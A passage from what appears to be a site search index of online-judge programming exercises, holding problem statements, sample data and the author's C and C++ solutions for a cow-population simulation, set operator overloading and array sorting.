3 6 28364 4530","title":"\u6837\u4f8b\u8f93\u51fa"},{"location":"szu_oj/oop/1226/#_7","text":"","title":"\u63d0\u793a"},{"location":"szu_oj/oop/1226/#_8","text":"\u989d\uff0c\u5199\u5b8c\u624d\u770b\u5230\u6807\u9898...\u61d2\u5f97\u6539\u4e86\uff0c\u4e8b\u5b9e\u4e0a\u53ea\u8981\u53bb\u6389Solver\u7c7b\u518d\u7a0d\u52a0\u6539\u52a8\u5c31\u53ef\u4ee5\u7b26\u5408\u8981\u6c42\u3002 \u8fd9\u91cc\u4e3b\u8981\u601d\u8def\u5c31\u662f\u76f8\u5f53\u4e8e\u6709\u4e00\u4e2a\u4e0a\u5e1d\u89c6\u89d2\uff1a std::vector<Cow *> cows \uff0c\u770b\u7740\u6240\u6709\u7684\u725b\u3002\u6bcf\u6b21\u5faa\u73af\u610f\u5473\u7740\u8fc7\u53bb\u4e00\u5e74\uff0c\u4e8e\u662f\u8ba9\u6240\u6709\u725b\u6210\u957f\u3001\u51fa\u751f\u6216\u662f\u6b7b\u4ea1\u3002 \u66f4\u65b0\uff1a\u7a81\u7136\u53d1\u73b0\u8fd8\u5fd8\u8bb0 delete \uff0c\u522b\u9524\u6211... \u53e6\u5916\u6bcf\u6b21\u6539\u52a8\u5bb9\u5668\u65f6\u67d0\u4e9b\u60c5\u51b5\u4f1a\u8ba9\u8fed\u4ee3\u5668\u5931\u6548\uff0c\u592a\u4e45\u6ca1\u770b\u300aEffective STL\u300b\u4e86\uff0c\u6709\u7a7a\u627e\u6765\u8fd9\u91cc\u8865\u4e0a\u4e00\u70b9\u4e1c\u897f\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 #include <iostream> #include <vector> class CowSolver { public : explicit CowSolver ( int limit ) : limit ( limit ) { cows . push_back ( new Cow ()); for ( int i = 1 ; i < limit ; ++ i ) { growUp (); create (); kill (); } } void println () { std :: cout << cows . size () << std :: endl ; } private : struct Cow { Cow () : age ( 1 ) {} int age ; }; int limit ; std :: vector < Cow *> cows ; void growUp () { for ( auto item : cows ) { item -> age += 1 ; } } void create () { for ( int i = 0 ; i < cows . size (); ++ i ) { if ( 4 <= cows [ i ] -> age && cows [ i ] -> age < 11 ) { cows . push_back ( new Cow ()); } } } void kill () { for ( auto it = cows . begin (); it != cows . end ();) { if (( * it ) -> age == 11 ) { it = cows . erase ( it ); } else { ++ it ; } } } }; int main () { int T ; std :: cin >> T ; while ( T -- ) { int year ; std :: cin >> year ; CowSolver cowSolver ( year ); cowSolver . println (); } return 0 ; }","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"szu_oj/oop/1237/","text":"\u96c6\u5408\uff08\u8fd0\u7b97\u7b26\u91cd\u8f7d\uff09 \u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB \u9898\u76ee\u63cf\u8ff0 \u96c6\u5408\u662f\u7531\u4e00\u4e2a\u6216\u591a\u4e2a\u786e\u5b9a\u7684\u5143\u7d20\u6240\u6784\u6210\u7684\u6574\u4f53\u3002\u96c6\u5408\u7684\u8fd0\u7b97\u6709\u5e76\u3001\u4ea4\u3001\u76f8\u5bf9\u8865\u7b49\u3002 \u96c6\u5408A\u548c\u96c6\u5408B\u7684\u4ea4\u96c6\uff1a\u7531\u5c5e\u4e8eA\u4e14\u5c5e\u4e8eB\u7684\u76f8\u540c\u5143\u7d20\u7ec4\u6210\u7684\u96c6\u5408\u3002 \u96c6\u5408A\u548c\u96c6\u5408B\u7684\u5e76\u96c6\uff1a\u7531\u6240\u6709\u5c5e\u4e8e\u96c6\u5408A\u6216\u5c5e\u4e8e\u96c6\u5408B\u7684\u5143\u7d20\u6240\u7ec4\u6210\u7684\u96c6\u5408\u3002 \u96c6\u5408B\u5173\u4e8e\u96c6\u5408A\u7684\u76f8\u5bf9\u8865\u96c6\uff0c\u8bb0\u505aA-B\uff1a\u7531\u5c5e\u4e8eA\u800c\u4e0d\u5c5e\u4e8eB\u7684\u5143\u7d20\u7ec4\u6210\u7684\u96c6\u5408\u3002 \u5047\u8bbe\u96c6\u5408A={10\uff0c20\uff0c30}\uff0c\u96c6\u5408B={1\uff0c10\uff0c50\uff0c8}\u3002\u5219A\u4e0eB\u7684\u5e76\u662f{10\uff0c20\uff0c30,1,50,8}\uff0cA\u4e0eB\u7684\u4ea4\u662f{10}\uff0cB\u5173\u4e8eA\u7684\u76f8\u5bf9\u8865\u96c6\u662f{20,30}\u3002 \u5b9a\u4e49\u6574\u6570\u96c6\u5408\u7c7bCSet\uff0c\u5c5e\u6027\u5305\u62ec\uff1a\u96c6\u5408\u4e2d\u7684\u5143\u7d20\u4e2a\u6570n\uff0c\u6574\u578b\u6307\u9488data\u5b58\u50a8\u96c6\u5408\u4e2d\u7684\u5143\u7d20\u3002 \u65b9\u6cd5\u6709\uff1a\u91cd\u8f7d\u8f93\u51fa\uff0c\u6309\u6837\u4f8b\u683c\u5f0f\u8f93\u51fa\u96c6\u5408\u4e2d\u7684\u5143\u7d20\u3002 \u91cd\u8f7d+\u8fd0\u7b97\u7b26\uff0c\u6c42\u96c6\u5408A\u548c\u96c6\u5408B\u7684\u5e76\u96c6\uff0c\u5e76\u8fd4\u56de\u7ed3\u679c\u96c6\u5408\u3002 \u91cd\u8f7d-\u8fd0\u7b97\u7b26\uff0c\u6c42\u96c6\u5408B\u5173\u4e8e\u96c6\u5408A\u7684\u76f8\u5bf9\u8865\u96c6\uff0c\u5e76\u8fd4\u56de\u7ed3\u679c\u96c6\u5408\u3002 \u91cd\u8f7d*\u8fd0\u7b97\u7b26\uff0c\u6c42\u96c6\u5408A\u548c\u96c6\u5408B\u7684\u4ea4\u96c6\uff0c\u5e76\u8fd4\u56de\u7ed3\u679c\u96c6\u5408\u3002 \u4e3b\u51fd\u6570\u8f93\u5165\u96c6\u5408A\u3001B\u7684\u6570\u636e\uff0c\u8ba1\u7b97\u96c6\u5408\u7684\u5e76\u3001\u4ea4\u3001\u76f8\u5bf9\u8865\u3002 \u53ef\u6839\u636e\u9898\u76ee\uff0c\u4e3aCSet\u7c7b\u6dfb\u52a0\u9700\u8981\u7684\u6210\u5458\u51fd\u6570\u3002 \u8f93\u5165 \u6d4b\u8bd5\u6b21\u6570 \u6bcf\u7ec4\u6d4b\u8bd5\u6570\u636e\u4e24\u884c\uff0c\u683c\u5f0f\u5982\u4e0b\uff1a \u7b2c\u4e00\u884c\uff1a\u96c6\u5408A\u7684\u5143\u7d20\u4e2a\u6570\u548c\u5143\u7d20 \u7b2c\u4e8c\u884c\uff1a\u96c6\u5408B\u7684\u5143\u7d20\u4e2a\u6570\u548c\u5143\u7d20 \u8f93\u51fa \u6bcf\u7ec4\u6d4b\u8bd5\u6570\u636e\u8f93\u51fa\u5982\u4e0b\uff1a \u7b2c\u4e00\u884c\uff1a\u96c6\u5408A \u7b2c\u4e8c\u884c\uff1a\u96c6\u5408B \u7b2c\u4e09\u884c\uff1aA\u548cB\u7684\u5e76 \u7b2c\u56db\u884c\uff1aA\u548cB\u7684\u4ea4 \u7b2c\u4e94\u884c\uff1aB\u5173\u4e8eA\u7684\u76f8\u5bf9\u8865\u96c6 \u4e0e A\u5173\u4e8eB\u7684\u76f8\u5bf9\u8865\u96c6\u7684\u5e76\uff0c\u5373(A-B)+(B-A) \u6bcf\u7ec4\u6d4b\u8bd5\u6570\u636e\u95f4\u4ee5\u7a7a\u884c\u5206\u9694\u3002 \u6837\u4f8b\u8f93\u5165 1 2 3 4 5 2 3 10 20 30 4 10 1 2 3 5 100 2 3 4 - 10 6 - 34 12 2 4 90 100 \u6837\u4f8b\u8f93\u51fa 1 2 3 4 5 6 7 8 9 10 11 A : 10 20 30 B : 10 1 2 3 A + B : 10 20 30 1 2 3 A * B : 10 ( A - B ) + ( B - A ) : 20 30 1 2 3 A : 100 2 3 4 - 10 B :- 34 12 2 4 90 100 A + B : 100 2 3 4 - 10 - 34 12 90 A * B : 100 2 4 ( A - B ) + ( B - A ) : 3 - 10 - 34 12 90 \u63d0\u793a \u89e3\u51b3\u65b9\u6848 \u8fd9\u4e2a\u5176\u5b9e\u6ca1\u5565\u597d\u8bf4\u7684...\u601d\u8def\u6e05\u6670\u5c31\u53ef\u4ee5\u4e86\u3002\u5e76\u96c6\u8fd0\u7b97\u53ef\u4ee5\u5148\u751f\u6210\u4e00\u4e2a\u4e34\u65f6\u6570\u7ec4\uff0c\u52a0\u5165\u96c6\u5408A\u7684\u5143\u7d20\uff0c\u7136\u540e\u518d\u52a0\u5165\u96c6\u5408B\u4e2d\u4e0d\u548c\u5df2\u52a0\u5165\u5143\u7d20\u91cd\u590d\u7684\u5143\u7d20\u3002\u76f8\u5bf9\u8865\u96c6\u53ef\u4ee5\u5148\u751f\u6210\u3001\u6dfb\u52a0\uff0c\u7136\u540e\u518d\u5220\u9664\u91cd\u590d\u7684\u3002 \u4e3b\u8981\u95ee\u9898\u53ef\u80fd\u5728\u4e8e\u6709\u540c\u5b66\u8bd5\u56fe\u8fd4\u56de\u4e00\u4e2a\u6307\u5411\u4e86\u5373\u5c06\u5931\u6548\u7684\u4e34\u65f6\u53d8\u91cf\u7684\u6307\u9488\u3002 You are returning a temporary object, but because you return it by value, the copy is created. If you return pointer or reference to temporary object, that would be a mistake. If you change the return type to const char * and return ss.str().c_str() you would return pointer to some buffer of temporary std::string returned by ss.str() and that would be bad. C++ returning temporary objects confusion - Stack Overflow 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 #include <iostream> #include <vector> #include <algorithm> class Set { public : explicit Set ( std :: vector < int > data ) : data ( std :: move ( data )) {} Set operator + ( const Set & rhs ) const { std :: vector < int > tmp ; tmp . assign ( this -> data . begin (), this -> data . end ()); for ( auto i : rhs . data ) { if ( std :: find ( tmp . begin (), tmp . end (), i ) == tmp . end ()) { tmp . push_back ( i ); } } return Set ( tmp ); } Set operator - ( const Set & rhs ) const { std :: vector < int > tmp ; tmp . assign ( this -> data . begin (), this -> data . end ()); for ( auto i : rhs . data ) { auto it = std :: find ( tmp . begin (), tmp . end (), i ); if ( it != tmp . end ()) { tmp . erase ( it ); } } return Set ( tmp ); } Set operator * ( const Set & rhs ) const { std :: vector < int > tmp ; for ( auto i1 : this -> data ) { for ( auto i2 : rhs . data ) { if ( i1 == i2 ) { tmp . push_back ( i1 ); } } } return Set ( tmp ); } friend std :: ostream & operator << ( std :: ostream & os , const Set & rhs ) { std :: cout << rhs . data . front (); for ( int i = 1 ; i < rhs . data . size (); ++ i ) { os << ' ' << rhs . data [ i ]; } return os ; } private : std :: vector < int > data ; }; int main () { int T ; std :: cin >> T ; while ( T -- ) { int sizeA , sizeB ; std :: cin >> sizeA ; std :: vector < int > vectorA ( sizeA ); for ( auto & i : vectorA ) { std :: cin >> i ; } std :: cin >> sizeB ; std :: vector < int > vectorB ( sizeB ); for ( auto & i : vectorB ) { std :: cin >> i ; } Set setA ( vectorA ), setB ( vectorB ); std :: cout << \"A:\" << setA << std :: endl << \"B:\" << setB << std :: endl << \"A+B:\" << setA + setB << std :: endl << \"A*B:\" << setA * setB << std :: endl << \"(A-B)+(B-A):\" << ( setA - setB ) + ( setB - setA ) << std :: endl ; std :: cout << std :: endl ; } return 0 ; }","title":"\u96c6\u5408\uff08\u8fd0\u7b97\u7b26\u91cd\u8f7d\uff09"},{"location":"szu_oj/oop/1237/#_1","text":"\u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB","title":"\u96c6\u5408\uff08\u8fd0\u7b97\u7b26\u91cd\u8f7d\uff09"},{"location":"szu_oj/oop/1237/#_2","text":"\u96c6\u5408\u662f\u7531\u4e00\u4e2a\u6216\u591a\u4e2a\u786e\u5b9a\u7684\u5143\u7d20\u6240\u6784\u6210\u7684\u6574\u4f53\u3002\u96c6\u5408\u7684\u8fd0\u7b97\u6709\u5e76\u3001\u4ea4\u3001\u76f8\u5bf9\u8865\u7b49\u3002 \u96c6\u5408A\u548c\u96c6\u5408B\u7684\u4ea4\u96c6\uff1a\u7531\u5c5e\u4e8eA\u4e14\u5c5e\u4e8eB\u7684\u76f8\u540c\u5143\u7d20\u7ec4\u6210\u7684\u96c6\u5408\u3002 \u96c6\u5408A\u548c\u96c6\u5408B\u7684\u5e76\u96c6\uff1a\u7531\u6240\u6709\u5c5e\u4e8e\u96c6\u5408A\u6216\u5c5e\u4e8e\u96c6\u5408B\u7684\u5143\u7d20\u6240\u7ec4\u6210\u7684\u96c6\u5408\u3002 \u96c6\u5408B\u5173\u4e8e\u96c6\u5408A\u7684\u76f8\u5bf9\u8865\u96c6\uff0c\u8bb0\u505aA-B\uff1a\u7531\u5c5e\u4e8eA\u800c\u4e0d\u5c5e\u4e8eB\u7684\u5143\u7d20\u7ec4\u6210\u7684\u96c6\u5408\u3002 \u5047\u8bbe\u96c6\u5408A={10\uff0c20\uff0c30}\uff0c\u96c6\u5408B={1\uff0c10\uff0c50\uff0c8}\u3002\u5219A\u4e0eB\u7684\u5e76\u662f{10\uff0c20\uff0c30,1,50,8}\uff0cA\u4e0eB\u7684\u4ea4\u662f{10}\uff0cB\u5173\u4e8eA\u7684\u76f8\u5bf9\u8865\u96c6\u662f{20,30}\u3002 \u5b9a\u4e49\u6574\u6570\u96c6\u5408\u7c7bCSet\uff0c\u5c5e\u6027\u5305\u62ec\uff1a\u96c6\u5408\u4e2d\u7684\u5143\u7d20\u4e2a\u6570n\uff0c\u6574\u578b\u6307\u9488data\u5b58\u50a8\u96c6\u5408\u4e2d\u7684\u5143\u7d20\u3002 \u65b9\u6cd5\u6709\uff1a\u91cd\u8f7d\u8f93\u51fa\uff0c\u6309\u6837\u4f8b\u683c\u5f0f\u8f93\u51fa\u96c6\u5408\u4e2d\u7684\u5143\u7d20\u3002 \u91cd\u8f7d+\u8fd0\u7b97\u7b26\uff0c\u6c42\u96c6\u5408A\u548c\u96c6\u5408B\u7684\u5e76\u96c6\uff0c\u5e76\u8fd4\u56de\u7ed3\u679c\u96c6\u5408\u3002 \u91cd\u8f7d-\u8fd0\u7b97\u7b26\uff0c\u6c42\u96c6\u5408B\u5173\u4e8e\u96c6\u5408A\u7684\u76f8\u5bf9\u8865\u96c6\uff0c\u5e76\u8fd4\u56de\u7ed3\u679c\u96c6\u5408\u3002 \u91cd\u8f7d*\u8fd0\u7b97\u7b26\uff0c\u6c42\u96c6\u5408A\u548c\u96c6\u5408B\u7684\u4ea4\u96c6\uff0c\u5e76\u8fd4\u56de\u7ed3\u679c\u96c6\u5408\u3002 \u4e3b\u51fd\u6570\u8f93\u5165\u96c6\u5408A\u3001B\u7684\u6570\u636e\uff0c\u8ba1\u7b97\u96c6\u5408\u7684\u5e76\u3001\u4ea4\u3001\u76f8\u5bf9\u8865\u3002 \u53ef\u6839\u636e\u9898\u76ee\uff0c\u4e3aCSet\u7c7b\u6dfb\u52a0\u9700\u8981\u7684\u6210\u5458\u51fd\u6570\u3002","title":"\u9898\u76ee\u63cf\u8ff0"},{"location":"szu_oj/oop/1237/#_3","text":"\u6d4b\u8bd5\u6b21\u6570 \u6bcf\u7ec4\u6d4b\u8bd5\u6570\u636e\u4e24\u884c\uff0c\u683c\u5f0f\u5982\u4e0b\uff1a \u7b2c\u4e00\u884c\uff1a\u96c6\u5408A\u7684\u5143\u7d20\u4e2a\u6570\u548c\u5143\u7d20 \u7b2c\u4e8c\u884c\uff1a\u96c6\u5408B\u7684\u5143\u7d20\u4e2a\u6570\u548c\u5143\u7d20","title":"\u8f93\u5165"},{"location":"szu_oj/oop/1237/#_4","text":"\u6bcf\u7ec4\u6d4b\u8bd5\u6570\u636e\u8f93\u51fa\u5982\u4e0b\uff1a \u7b2c\u4e00\u884c\uff1a\u96c6\u5408A \u7b2c\u4e8c\u884c\uff1a\u96c6\u5408B \u7b2c\u4e09\u884c\uff1aA\u548cB\u7684\u5e76 \u7b2c\u56db\u884c\uff1aA\u548cB\u7684\u4ea4 \u7b2c\u4e94\u884c\uff1aB\u5173\u4e8eA\u7684\u76f8\u5bf9\u8865\u96c6 \u4e0e A\u5173\u4e8eB\u7684\u76f8\u5bf9\u8865\u96c6\u7684\u5e76\uff0c\u5373(A-B)+(B-A) \u6bcf\u7ec4\u6d4b\u8bd5\u6570\u636e\u95f4\u4ee5\u7a7a\u884c\u5206\u9694\u3002","title":"\u8f93\u51fa"},{"location":"szu_oj/oop/1237/#_5","text":"1 2 3 4 5 2 3 10 20 30 4 10 1 2 3 5 100 2 3 4 - 10 6 - 34 12 2 4 90 100","title":"\u6837\u4f8b\u8f93\u5165"},{"location":"szu_oj/oop/1237/#_6","text":"1 2 3 4 5 6 7 8 9 10 11 A : 10 20 30 B : 10 1 2 3 A + B : 10 20 30 1 2 3 A * B : 10 ( A - B ) + ( B - A ) : 20 30 1 2 3 A : 100 2 3 4 - 10 B :- 34 12 2 4 90 100 A + B : 100 2 3 4 - 10 - 34 12 90 A * B : 100 2 4 ( A - B ) + ( B - A ) : 3 - 10 - 34 12 90","title":"\u6837\u4f8b\u8f93\u51fa"},{"location":"szu_oj/oop/1237/#_7","text":"","title":"\u63d0\u793a"},{"location":"szu_oj/oop/1237/#_8","text":"\u8fd9\u4e2a\u5176\u5b9e\u6ca1\u5565\u597d\u8bf4\u7684...\u601d\u8def\u6e05\u6670\u5c31\u53ef\u4ee5\u4e86\u3002\u5e76\u96c6\u8fd0\u7b97\u53ef\u4ee5\u5148\u751f\u6210\u4e00\u4e2a\u4e34\u65f6\u6570\u7ec4\uff0c\u52a0\u5165\u96c6\u5408A\u7684\u5143\u7d20\uff0c\u7136\u540e\u518d\u52a0\u5165\u96c6\u5408B\u4e2d\u4e0d\u548c\u5df2\u52a0\u5165\u5143\u7d20\u91cd\u590d\u7684\u5143\u7d20\u3002\u76f8\u5bf9\u8865\u96c6\u53ef\u4ee5\u5148\u751f\u6210\u3001\u6dfb\u52a0\uff0c\u7136\u540e\u518d\u5220\u9664\u91cd\u590d\u7684\u3002 \u4e3b\u8981\u95ee\u9898\u53ef\u80fd\u5728\u4e8e\u6709\u540c\u5b66\u8bd5\u56fe\u8fd4\u56de\u4e00\u4e2a\u6307\u5411\u4e86\u5373\u5c06\u5931\u6548\u7684\u4e34\u65f6\u53d8\u91cf\u7684\u6307\u9488\u3002 You are returning a temporary object, but because you return it by value, the copy is created. If you return pointer or reference to temporary object, that would be a mistake. If you change the return type to const char * and return ss.str().c_str() you would return pointer to some buffer of temporary std::string returned by ss.str() and that would be bad. C++ returning temporary objects confusion - Stack Overflow 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 #include <iostream> #include <vector> #include <algorithm> class Set { public : explicit Set ( std :: vector < int > data ) : data ( std :: move ( data )) {} Set operator + ( const Set & rhs ) const { std :: vector < int > tmp ; tmp . assign ( this -> data . begin (), this -> data . end ()); for ( auto i : rhs . data ) { if ( std :: find ( tmp . begin (), tmp . end (), i ) == tmp . end ()) { tmp . push_back ( i ); } } return Set ( tmp ); } Set operator - ( const Set & rhs ) const { std :: vector < int > tmp ; tmp . assign ( this -> data . begin (), this -> data . end ()); for ( auto i : rhs . data ) { auto it = std :: find ( tmp . begin (), tmp . end (), i ); if ( it != tmp . end ()) { tmp . erase ( it ); } } return Set ( tmp ); } Set operator * ( const Set & rhs ) const { std :: vector < int > tmp ; for ( auto i1 : this -> data ) { for ( auto i2 : rhs . data ) { if ( i1 == i2 ) { tmp . push_back ( i1 ); } } } return Set ( tmp ); } friend std :: ostream & operator << ( std :: ostream & os , const Set & rhs ) { std :: cout << rhs . data . front (); for ( int i = 1 ; i < rhs . data . size (); ++ i ) { os << ' ' << rhs . data [ i ]; } return os ; } private : std :: vector < int > data ; }; int main () { int T ; std :: cin >> T ; while ( T -- ) { int sizeA , sizeB ; std :: cin >> sizeA ; std :: vector < int > vectorA ( sizeA ); for ( auto & i : vectorA ) { std :: cin >> i ; } std :: cin >> sizeB ; std :: vector < int > vectorB ( sizeB ); for ( auto & i : vectorB ) { std :: cin >> i ; } Set setA ( vectorA ), setB ( vectorB ); std :: cout << \"A:\" << setA << std :: endl << \"B:\" << setB << std :: endl << \"A+B:\" << setA + setB << std :: endl << \"A*B:\" << setA * setB << std :: endl << \"(A-B)+(B-A):\" << ( setA - setB ) + ( setB - setA ) << std :: endl ; std :: cout << std :: endl ; } return 0 ; }","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"szu_oj/uooc/1334/","text":"\u5206\u7c7b\u6392\u5e8f(\u51fd\u6570) \u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB \u9898\u76ee\u63cf\u8ff0 \u4ece\u952e\u76d8\u8f93\u516510\u4e2a\u6574\u6570\uff0810\u4e2a\u6574\u6570\u5747\u4e0d\u76f8\u540c\uff09\uff0c \u7136\u540e\u518d\u4ece\u952e\u76d8\u4e2d\u8f93\u5165\u4e00\u4e2a\u6574\u6570a\uff0c \u5982\u679c\u8be5\u6574\u6570a\u4e3a\u5947\u6570\uff0c \u4e14\u4e0e\u8fd910\u4e2a\u6574\u6570\u4e2d\u7684\u4efb\u4e00\u4e2a\u6570\u76f8\u540c\uff0c\u5219\u5220\u6389\u4e0ea\u76f8\u540c\u7684 \u8fd9\u4e2a\u6570\uff0c\u5e76\u5c06\u5269\u4e0b\u76849\u4e2a\u6570\u6309\u5347\u5e8f\u6392\u5e8f\u8f93\u51fa\uff1b \u82e5a\u4e3a\u5076\u6570\uff0c \u4e14\u4e0e\u8fd910\u4e2a\u6570\u90fd\u4e0d\u540c\uff0c\u5219\u52a0\u5165a\uff0c\u5e76\u5c06\u8fd911\u4e2a\u6570\u964d\u5e8f\u6392 \u5e8f\u8f93\u51fa\uff1b \u5426\u5219\uff0c\u5219\u5c06\u8fd910\u4e2a\u6570\u5947\u6570\u5728\u524d\uff0c\u5076\u6570\u5728\u540e\uff0c \u964d\u5e8f\u6392\u5217\u8f93\u51fa\u3002 \u4f8b\u5982\uff0c10\u4e2a\u6570\u5206\u522b\u4e3a6\uff0c89\uff0c34\uff0c12\uff0c 0\uff0c-8\uff0c78\uff0c15\uff0c9\uff0c3. \u82e5a\u4e3a9\uff0c\u5219\u8f93\u51fa\u4e3a\uff1a-8\uff0c0\uff0c3\uff0c 6\uff0c12\uff0c15\uff0c34\uff0c78\uff0c89. \u82e5a\u4e3a2\uff0c\u5219\u8f93\u51fa\u4e3a\uff1a89\uff0c78\uff0c 34\uff0c15\uff0c12\uff0c9\uff0c6\uff0c3\uff0c2\uff0c0\uff0c-8. \u82e5a\u4e3a7\u6216\u800512\uff0c\u5219 \u8f93\u51fa\u4e3a\uff1a89\uff0c15\uff0c9\uff0c3\uff0c78\uff0c34\uff0c12\uff0c6\uff0c0\uff0c-8. \u8981\u6c42\uff1a\u4f7f\u7528\u51fd\u6570\u89e3\u51b3\u672c\u9898\uff0c\u81f3\u5c11\u7f16\u5199\u4ee5\u4e0b\u51e0\u4e2a\u51fd\u6570\uff0c 1\u3001\u5347\u5e8f\u6392\u5e8f\u51fd\u6570void sort(int a[], int n)\uff1b 2\u3001\u67e5\u627e\u51fd\u6570int find(int a[],int n,int value)----\u5728\u5927\u5c0f\u4e3an\u7684a\u6570\u7ec4\u4e2d\u67e5\u627e\u503c\u4e3avalue\u7684\u5143\u7d20\uff0c\u627e\u5230\u5c31\u8fd4\u56de\u5143\u7d20\u7684\u4e0b\u6807\uff0c\u627e\u4e0d\u5230\uff0c\u5c31\u8fd4\u56de-1\uff1b 3\u3001\u8f93\u51fa\u51fd\u6570display(int a[], int n)---\u9010\u4e2a\u8f93\u51fa\u6570\u7ec4a\u7684\u5143\u7d20\uff1b 4\u3001\u53cd\u8f6c\u6570\u7ec4\u51fd\u6570void reverse(int a[], int n)----\u5c06\u6570\u7ec4\u9006\u5e8f\u3002 \u8f93\u5165 \u6d4b\u8bd5\u6570\u636e\u7684\u7ec4\u6570n \u7b2c\u4e00\u7ec4\u6d4b\u8bd5\u6570\u636e\u768410\u4e2a\u6574\u6570 \u7b2c\u4e00\u7ec4\u7684\u6574\u6570a \u7b2c\u4e8c\u7ec4\u6d4b\u8bd5\u6570\u636e\u768410\u4e2a\u6574\u6570 \u7b2c\u4e8c\u7ec4\u7684\u6574\u6570a ...... \u7b2cn\u7ec4\u6d4b\u8bd5\u6570\u636e\u768410\u4e2a\u6574\u6570 \u7b2cn\u7ec4\u7684\u6574\u6570a \u8f93\u51fa \u7b2c\u4e00\u7ec4\u6570\u636e\u6392\u5e8f\u8f93\u51fa \u7b2c\u4e8c\u7ec4\u6570\u636e\u6392\u5e8f\u8f93\u51fa ....... \u7b2cn\u7ec4\u6570\u636e\u6392\u5e8f\u8f93\u51fa \u6837\u4f8b\u8f93\u5165 1 2 3 4 5 6 7 3 6 89 34 12 0 - 8 78 15 9 3 9 6 89 34 12 0 - 8 78 15 9 3 2 6 89 34 12 0 - 8 78 15 9 3 7 \u6837\u4f8b\u8f93\u51fa 1 2 3 - 8 0 3 6 12 15 34 78 89 89 78 34 15 12 9 6 3 2 0 - 8 89 15 9 3 78 34 12 6 0 - 8 \u63d0\u793a \u89e3\u51b3\u65b9\u6848 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 #include <stdio.h> #define FAILED_FIND_IN_ARRAY -1 struct Array { int data [ 16 ]; int size ; }; void scanToArray ( struct Array * array ); int findInArray ( struct Array * array , int data ); void sortArray ( struct Array * array ); void reverseArray ( struct Array * array ); void sortArrayInOddAndEven ( struct Array * array ); void printArray ( struct Array * array ); int main () { int ctrl ; scanf ( \"%d\" , & ctrl ); while ( ctrl -- ) { struct Array array = {}; scanToArray ( & array ); int number ; scanf ( \"%d\" , & number ); if ( number % 2 != 0 && findInArray ( & array , number ) != FAILED_FIND_IN_ARRAY ) { array . size -= 1 ; for ( int i = findInArray ( & array , number ); i < array . size ; ++ i ) { array . data [ i ] = array . data [ i + 1 ]; } sortArray ( & array ); } else if ( number % 2 == 0 && findInArray ( & array , number ) == FAILED_FIND_IN_ARRAY ) { array . data [ array . size ] = number ; array . size += 1 ; sortArray ( & array ); reverseArray ( & array ); } else { sortArrayInOddAndEven ( & array ); } printArray ( & array ); } return 0 ; } void scanToArray ( struct Array * array ) { array -> size = 10 ; for ( int i = 0 ; i < array -> size ; ++ i ) { scanf ( \"%d\" , & array -> data [ i ]); } } int findInArray ( struct Array * array , int data ) { for ( int i = 0 ; i < array -> size ; ++ i ) { if ( array -> data [ i ] == data ) { return i ; } } return - 1 ; } void sortArray ( struct Array * array ) { for ( int i1 = 0 ; i1 < array -> size - 1 ; ++ i1 ) { for ( int i2 = 0 ; i2 < array -> size - 1 - i1 ; ++ i2 ) { if ( array -> data [ i2 ] > array -> data [ i2 + 1 ]) { int data = array -> data [ i2 ]; array -> data [ i2 ] = array -> data [ i2 + 1 ]; array -> data [ i2 + 1 ] = data ; } } } } void reverseArray ( struct Array * array ) { for ( int i = 0 ; i < array -> size / 2 ; ++ i ) { int data = array -> data [ i ]; array -> data [ i ] = array -> data [ array -> size - 1 - i ]; array -> data [ array -> size - 1 - i ] = data ; } } void sortArrayInOddAndEven ( struct Array * array ) { struct Array odd = {}, even = {}; for ( int i = 0 ; i < array -> size ; ++ i ) { if ( array -> data [ i ] % 2 == 0 ) { even . data [ even . size ] = array -> data [ i ]; even . size += 1 ; } else { odd . data [ odd . size ] = array -> data [ i ]; odd . size += 1 ; } } sortArray ( & odd ); reverseArray ( & odd ); sortArray ( & even ); reverseArray ( & even ); for ( int i = 0 ; i < odd . size ; ++ i ) { array -> data [ i ] = odd . data [ i ]; } for ( int i = 0 ; i < even . size ; ++ i ) { array -> data [ i + odd . size ] = even . data [ i ]; } } void printArray ( struct Array * array ) { printf ( \"%d\" , array -> data [ 0 ]); for ( int i = 1 ; i < array -> size ; ++ i ) { printf ( \" %d\" , array -> data [ i ]); } printf ( \" \\n \" ); }","title":"\u5206\u7c7b\u6392\u5e8f(\u51fd\u6570)"},{"location":"szu_oj/uooc/1334/#_1","text":"\u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB","title":"\u5206\u7c7b\u6392\u5e8f(\u51fd\u6570)"},{"location":"szu_oj/uooc/1334/#_2","text":"\u4ece\u952e\u76d8\u8f93\u516510\u4e2a\u6574\u6570\uff0810\u4e2a\u6574\u6570\u5747\u4e0d\u76f8\u540c\uff09\uff0c \u7136\u540e\u518d\u4ece\u952e\u76d8\u4e2d\u8f93\u5165\u4e00\u4e2a\u6574\u6570a\uff0c \u5982\u679c\u8be5\u6574\u6570a\u4e3a\u5947\u6570\uff0c 